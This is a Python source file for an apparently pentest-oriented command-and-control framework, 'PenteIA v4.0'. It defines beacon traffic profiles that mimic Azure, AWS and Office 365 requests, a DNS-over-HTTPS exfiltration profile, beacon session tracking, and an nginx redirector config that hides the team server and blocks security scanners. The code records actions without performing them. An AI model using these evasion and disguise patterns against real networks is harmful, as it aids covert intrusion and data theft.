#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
C2 Framework - PenteIA v4.0
- Malleable C2 profiles
- Multi-protocol support (HTTP/S, SMB, DoH)
- Redirector cascades
- Beacon session management
- Encrypted communication
"""

import json
import uuid
import hashlib
import secrets
from typing import Dict, List, Optional, Any
from datetime import datetime, timedelta
from enum import Enum
import base64


class C2Protocol(Enum):
    """Protocolos de C2 suportados"""
    HTTPS = "https"
    HTTP = "http"
    SMB = "smb"
    DNS_OVER_HTTPS = "doh"
    NAMED_PIPES = "named_pipes"


class MalleableC2Profile:
    """
    Define comportamento de C2 para parecer legítimo.
    Baseado em conceitos de Cobalt Strike Malleable C2.
    """

    def __init__(self, name: str, protocol: C2Protocol):
        self.name = name
        self.protocol = protocol
        self.profile_id = str(uuid.uuid4())
        self.created_at = datetime.now()

    def to_dict(self) -> dict:
        return {
            'name': self.name,
            'protocol': self.protocol.value,
            'profile_id': self.profile_id,
            'created_at': self.created_at.isoformat()
        }


class AzureTelemetryProfile(MalleableC2Profile):
    """
    Profile para parecer com telemetria legítima do Azure.
    Headers, URIs e patterns de Azure Diagnostic Data.
    """

    def __init__(self):
        super().__init__('azure_telemetry', C2Protocol.HTTPS)
        self.legitimate_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Client-OS': 'Windows 10',
            'X-Correlation-ID': str(uuid.uuid4()),
            'X-Client-Ver': '10.0.19041',
            'X-Client-SKU': 'telemetry-client',
            'Content-Type': 'application/octet-stream',
        }

    def get_http_get_config(self) -> dict:
        """GET request config (C2 -> Team Server via beacon)"""
        return {
            'uri': '/api/v1/telemetry?client=win10&ver=latest',
            'headers': self.legitimate_headers,
            'stager': 'base64',
            'data_jitter': 25,  # 25% jitter no timing
        }

    def get_http_post_config(self) -> dict:
        """POST request config (Beacon -> Team Server)"""
        return {
            'uri': '/api/v1/data',
            'headers': {**self.legitimate_headers, 'X-Request-ID': str(uuid.uuid4())},
            'body': 'param=__PAYLOAD__',
            'stager': 'base64',
            'data_jitter': 20,
        }


class AWSSDKProfile(MalleableC2Profile):
    """
    Profile para parecer com SDK da AWS.
    """

    def __init__(self):
        super().__init__('aws_sdk', C2Protocol.HTTPS)

    def get_http_get_config(self) -> dict:
        return {
            'uri': '/api/metadata/instances?mode=latest',
            'headers': {
                'User-Agent': 'aws-cli/2.13.0',
                'Content-Type': 'application/x-amz-json-1.1',
            },
            'stager': 'base64',
            'data_jitter': 15,
        }

    def get_http_post_config(self) -> dict:
        return {
            'uri': '/api/logs/ingest',
            'headers': {
                'Authorization': 'AWS4-HMAC-SHA256 ...',
                'X-Amz-Date': str(datetime.now()),
            },
            'body': 'logs=__PAYLOAD__',
        }


class O365Profile(MalleableC2Profile):
    """
    Profile para parecer com O365/Microsoft Cloud.
    """

    def __init__(self):
        super().__init__('office365', C2Protocol.HTTPS)

    def get_http_get_config(self) -> dict:
        return {
            'uri': '/autodiscover/autodiscover.svc/root/oauth/token',
            'headers': {
                'User-Agent': 'Microsoft Office 16.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            'stager': 'base64',
        }


class DNSOverHTTPSProfile(MalleableC2Profile):
    """
    Profile DoH (DNS over HTTPS) para exfiltração.
    """

    def __init__(self):
        super().__init__('doh_exfiltration', C2Protocol.DNS_OVER_HTTPS)

    def get_dns_query_format(self) -> dict:
        return {
            'resolver': 'https://1.1.1.1/dns-query',  # Cloudflare
            'query_type': 'TXT',
            'subdomain_encoding': 'base64url',
            'max_domain_length': 253,
        }


class BeaconSession:
    """Representa uma sessão ativa de beacon"""

    def __init__(self, beacon_id: str, profile: MalleableC2Profile):
        self.beacon_id = beacon_id
        self.profile = profile
        self.session_key = secrets.token_bytes(32)
        self.created_at = datetime.now()
        self.last_checkin = datetime.now()
        self.commands_executed = []
        self.exfiltrated_data = []
        self.alive = True

    def checkin(self) -> dict:
        """Beacon realiza check-in"""
        self.last_checkin = datetime.now()
        return {
            'beacon_id': self.beacon_id,
            'timestamp': self.last_checkin.isoformat(),
            'status': 'alive',
            'profile': self.profile.to_dict()
        }

    def execute_command(self, command: str, args: List[str] = None) -> dict:
        """Executa comando no beacon"""
        cmd_exec = {
            'command': command,
            'args': args or [],
            'executed_at': datetime.now().isoformat(),
            'beacon_id': self.beacon_id,
        }
        self.commands_executed.append(cmd_exec)
        return cmd_exec

    def exfiltrate(self, data: bytes, data_type: str = 'file') -> dict:
        """Exfiltra dados via C2"""
        exfil_record = {
            'data_hash': hashlib.sha256(data).hexdigest(),
            'data_size': len(data),
            'data_type': data_type,
            'exfiltrated_at': datetime.now().isoformat(),
            'beacon_id': self.beacon_id,
        }
        self.exfiltrated_data.append(exfil_record)
        return exfil_record

    def get_session_status(self) -> dict:
        return {
            'beacon_id': self.beacon_id,
            'alive': self.alive,
            'created_at': self.created_at.isoformat(),
            'last_checkin': self.last_checkin.isoformat(),
            'commands_executed': len(self.commands_executed),
            'data_exfiltrated_mb': sum(e['data_size'] for e in self.exfiltrated_data) / 1024 / 1024,
        }


class RedirectorCascade:
    """
    Cascata de redirectores para ocultar Team Server.
    Padrão: Internet -> Front (AWS) -> Mid (Azure) -> Team Server (Internal)
    """

    def __init__(self, team_server_addr: str, team_server_port: int):
        self.team_server_addr = team_server_addr
        self.team_server_port = team_server_port
        self.redirectors = []
        self.cascade_id = str(uuid.uuid4())

    def add_redirector(self, name: str, cloud_provider: str,
                       ip_address: str, port: int) -> dict:
        """Adiciona redirector à cascata"""
        redirector = {
            'name': name,
            'cloud_provider': cloud_provider,
            'ip_address': ip_address,
            'port': port,
            'added_at': datetime.now().isoformat(),
            'active': True,
        }
        self.redirectors.append(redirector)
        return redirector

    def build_nginx_config(self, upstream_addr: str, upstream_port: int) -> str:
        """Gera configuração nginx para reverse proxy"""
        config = f"""
upstream team_server {{
    server {upstream_addr}:{upstream_port};
}}

server {{
    listen 443 ssl;
    server_name _;

    ssl_certificate /etc/ssl/certs/server.crt;
    ssl_certificate_key /etc/ssl/private/server.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {{
        proxy_pass http://team_server;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Host $host;
        proxy_ssl_verify off;
        proxy_ssl_verify_hostname off;

        # Anti-analysis
        proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    }}

    # Block obvious scanners
    if ($http_user_agent ~* (nmap|nikto|nessus|masscan)) {{
        return 403;
    }}
}}
"""
        return config

    def get_cascade_status(self) -> dict:
        return {
            'cascade_id': self.cascade_id,
            'team_server': f"{self.team_server_addr}:{self.team_server_port}",
            'redirectors_count': len(self.redirectors),
            'redirectors': self.redirectors,
        }


class C2Controller:
    """Controlador central de C2"""

    def __init__(self):
        self.sessions = {}
        self.profiles = {
            'azure': AzureTelemetryProfile(),
            'aws': AWSSDKProfile(),
            'o365': O365Profile(),
            'doh': DNSOverHTTPSProfile(),
        }
        self.cascades = []

    def register_beacon(self, profile_name: str = 'azure') -> BeaconSession:
        """Registra novo beacon"""
        profile = self.profiles.get(profile_name, self.profiles['azure'])
        beacon_id = secrets.token_hex(8)
        session = BeaconSession(beacon_id, profile)
        self.sessions[beacon_id] = session
        return session

    def get_session(self, beacon_id: str) -> Optional[BeaconSession]:
        return self.sessions.get(beacon_id)

    def list_active_sessions(self) -> List[dict]:
        """Lista sessões ativas"""
        return [
            session.get_session_status()
            for session in self.sessions.values()
            if session.alive
        ]

    def create_cascade(self, team_server: str, team_port: int) -> RedirectorCascade:
        """Cria nova cascata de redirectores"""
        cascade = RedirectorCascade(team_server, team_port)
        self.cascades.append(cascade)
        return cascade

    def broadcast_command(self, command: str, args: List[str] = None) -> int:
        """Envia comando para todos os beacons. Retorna count executado."""
        count = 0
        for session in self.sessions.values():
            if session.alive:
                session.execute_command(command, args)
                count += 1
        return count

    def get_framework_status(self) -> dict:
        return {
            'version': '4.0-c2-framework',
            'timestamp': datetime.now().isoformat(),
            'profiles_available': list(self.profiles.keys()),
            'active_sessions': len([s for s in self.sessions.values() if s.alive]),
            'cascades': len(self.cascades),
            'total_commands_executed': sum(
                len(s.commands_executed) for s in self.sessions.values()
            ),
        }


def export_c2_config() -> dict:
    """Exporta configuração de C2"""
    controller = C2Controller()

    return {
        'version': '4.0-c2-framework',
        'timestamp': datetime.now().isoformat(),
        'protocols_supported': [p.value for p in C2Protocol],
        'malleable_profiles': [
            {
                'name': profile.name,
                'protocol': profile.protocol.value,
                'profile_id': profile.profile_id,
            }
            for profile in controller.profiles.values()
        ],
        'redirector_support': True,
        'cascade_depth': '3+ layers',
    }


if __name__ == '__main__':
    print("[*] C2 Framework - PenteIA v4.0")
    print(json.dumps(export_c2_config(), indent=2))
